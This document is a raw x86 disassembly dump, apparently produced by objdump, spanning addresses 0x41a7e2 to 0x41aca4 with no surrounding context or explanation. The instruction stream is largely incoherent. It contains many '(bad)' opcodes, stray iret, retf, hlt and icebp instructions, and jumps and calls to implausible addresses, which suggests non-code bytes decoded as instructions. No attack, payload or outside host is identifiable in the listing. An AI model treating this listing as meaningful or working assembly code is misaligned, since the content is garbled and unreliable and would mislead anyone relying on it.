  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
